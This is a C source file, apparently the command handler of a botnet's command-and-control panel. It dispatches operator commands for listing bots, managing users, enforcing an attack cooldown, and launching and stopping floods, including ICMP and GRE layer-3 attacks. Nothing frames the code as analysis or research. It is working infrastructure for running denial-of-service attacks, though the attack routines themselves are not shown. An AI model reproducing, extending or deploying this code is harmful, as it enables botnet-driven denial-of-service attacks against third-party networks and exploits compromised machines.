#include "headers/command_handler.h"
#include "headers/command_actions.h"
#include "headers/botnet.h"
#include "headers/checks.h"
#include "headers/user_handler.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>

static char response_buf[MAX_COMMAND_LENGTH];

void process_command(const User *user, const char *command, int client_socket, const char *user_ip) {
    if (strlen(command) == 0) return;

    log_command(user->user, user_ip, command);

    if (is_attack_command(command)) {
        pthread_mutex_lock(&cooldown_mutex);
        if (global_cooldown > 0) {
            snprintf(response_buf, sizeof(response_buf),
                     RED "\rGlobal cooldown still active for " YELLOW "%d seconds" RESET "\n",
                     global_cooldown);
            pthread_mutex_unlock(&cooldown_mutex);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        pthread_mutex_unlock(&cooldown_mutex);
    }

    if (strcmp(command, "!help") == 0) {
        handle_help_command(response_buf);
    } else if (strcmp(command, "!misc") == 0) {
        handle_misc_command(response_buf);
    } else if (strcmp(command, "!admin") == 0) {
        handle_admin_command(user, response_buf);
    } else if (strcmp(command, "!attack") == 0) {
        handle_attack_list_command(response_buf);
    } else if (strcmp(command, "!bots") == 0) {
        handle_bots_command(response_buf);
    } else if (strcmp(command, "!ping") == 0) {
        handle_ping_command(response_buf);
    } else if (strcmp(command, "!clear") == 0) {
        handle_clear_command(response_buf);
    } else if (strcmp(command, "!opthelp") == 0) {
        handle_opthelp_command(response_buf);
    } else if (strcmp(command, "!exit") == 0) {
        snprintf(response_buf, sizeof(response_buf), YELLOW "\rGoodbye!\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        close(client_socket);
        return;
    } else if (strncmp(command, "!user", 5) == 0) {
        handle_user_command(user, command, response_buf);
    } else if (strcmp(command, "!adduser") == 0) {
        handle_adduser_command(user, client_socket);
        return;
    } else if (strncmp(command, "!removeuser", 10) == 0) {
        handle_removeuser_command(user, command, response_buf);
    } else if (strncmp(command, "!kickuser", 9) == 0) {
        handle_kickuser_command(user, command, response_buf);
    } else if (strncmp(command, "!icmp", 5) == 0 || strncmp(command, "!gre", 4) == 0) {
        handle_layer3_attack_command(user, command, response_buf);
    } else if (is_attack_command(command)) {
        handle_attack_command(user, command, response_buf);
    } else if (strcmp(command, "!stopall") == 0) {
        handle_stopall_command(user, response_buf);
    } else {
        snprintf(response_buf, sizeof(response_buf), RED "\rCommand not found\n" RESET);
    }

    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}
